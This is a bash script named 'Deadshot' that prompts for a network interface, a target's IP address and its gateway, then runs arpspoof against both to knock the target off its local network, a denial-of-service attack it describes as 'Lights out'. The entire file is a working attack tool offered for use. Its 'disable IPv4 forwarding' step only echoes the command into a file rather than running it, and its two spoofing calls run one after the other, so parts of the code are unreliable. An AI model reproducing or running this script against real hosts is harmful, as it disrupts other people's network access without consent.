#!/bin/bash

#by jon-boopin
#arpspoof/dsniff under the GNU license

#Request for sudo
if [ "$(id -u)" -ne 0 ]; then
        echo 'This script must be run as root.' >&2
        exit 1
fi

tput setaf 2

echo "______                   _       _             _   ";
echo "|  _  \                 | |     | |           | |  ";
echo "| | | |  ___   __ _   __| | ___ | |__    ___ _| |__ ";
echo "| | | | / _ \ / _\` | / _\` |/ __|| '_ \  / _ \ | __|";
echo "| |/ / |  __/| (_| || (_| |\__ \| | | || (_) || |_ ";
echo "|___/   \___| \__,_| \__,_||___/|_| |_| \___/  \__|";
echo #                                                                                                 
echo  Deny service to targeted hosts.
echo  Enter the interface to listen on, the host IP address, and
echo  their gateway. You must have arpspoof installed. IPv4 forwarding
echo  will be disabled.
echo #
#the script takes the input for the interface, target, and router
read -p "[Deadshot] Enter the name of the inteface you're listening on: " interface
echo #
echo "[Deadshot] Listening on interface" $interface
echo #
read -p "[Deadshot] Enter the target's IPv4 address: " target
echo #
echo "[Deadshot] Target's IP: $target"
echo #
read -p "[Deadshot] Enter the ARP table's host address (Router): " host
echo #
echo "[Deadshot] Target's Gateway: $host" 
echo #
#dependency check
echo "[Deadshot] Checking for dependencies..."
wait
echo #
#if else statement for arpspoof 
if command -v arpspoof >/dev/null 2>&1 ; then
    echo "[Deadshot] arpspoof found..."
    echo #
else
    echo "[Deadshot] arpspoof not found. You can install arpspoof with 'sudo apt-get install dsniff'."
	exit 1
fi
#disables IPv4 forwarding
echo "[Deadshot] Disabling IPv4 forwarding..."
wait
echo sysctl -w net.ipv4.ip_forward=0 > /tmp/out
wait
echo #
echo "[Deadshot] Lights out, $target"
wait
echo #
arpspoof -i $interface -t $target -r $host
wait 
arpspoof -i $interface -t $host -r $target
wait
